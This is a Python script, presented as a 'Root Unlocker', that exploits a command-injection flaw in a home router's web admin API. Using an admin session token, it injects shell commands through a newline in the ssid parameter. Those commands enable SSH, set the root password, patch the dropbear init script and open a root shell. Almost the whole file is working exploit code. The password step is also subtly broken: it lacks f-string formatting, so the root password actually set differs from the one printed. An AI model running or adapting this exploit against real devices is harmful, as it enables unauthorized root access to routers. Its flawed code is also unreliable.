#!/usr/bin/env python3.6
import argparse
import sys
import os
import shutil
import urllib
import urllib.request
import json

def parse_arguments():
    parser = argparse.ArgumentParser(description='Root Unlocker')
    parser.add_argument('--stok', metavar='STOK', required=True, type=str,
                        help="the stok extracted from the admin page url")
    parser.add_argument('--gateway', metavar='GATEWAY', default="192.168.31.1",
                         help="the ip of the router's gateway")
    parser.add_argument('--ssh-password', metavar='PASSWORD', default="1234578",
                         help="the password for the root user")
    return parser.parse_args()


def gateway_reachable():
    try:
        with urllib.request.urlopen(f"http://{args.gateway}") as response:
            response.read()
            return True
    except:
        return False

def execute_command(command):
    url_prefix = f"http://{args.gateway}/cgi-bin/luci/;stok={args.stok}/api/misystem/set_config_iotdev?bssid=gallifrey&user_id=doctor&ssid=-h%0A"
    with urllib.request.urlopen(url_prefix + urllib.parse.quote(command)) as response:
        res_code = json.loads(response.read()).get("code", -1)
        if res_code != 0:
            raise ValueError(f"command returned code: {res_code}")

def gain_root():
    print("turning on and persisting ssh on nvram")
    execute_command("nvram set ssh_en=1")
    execute_command("nvram commit")

    print("backing up dropbear configuration")
    execute_command("cp /etc/init.d/dropbear /etc/init.d/dropbear_backup")

    print("setting root password")
    execute_command("echo -e '{args.ssh_password}\n{args.ssh_password}' | passwd root")

    print("enabling dropbear (ssh server)")
    execute_command("sed -i '/flg_ssh.*release/ { :a; N; /fi/! ba };/return 0/d' /etc/init.d/dropbear")
    execute_command("/etc/init.d/dropbear enable")
    execute_command("/etc/init.d/dropbear start")

if __name__ == "__main__":
    args = parse_arguments()

    if not gateway_reachable():
        print("unable to perform exploit: web interface isn't responding", file=sys.stderr)
        sys.exit(1)

    gain_root()

    print(f"done! ssh password is: {args.ssh_password}")
    if input("Do you want to ssh now? [y/n] ").lower() == "y":
        os.execl(shutil.which("ssh"), "ssh", f"root@{args.gateway}")
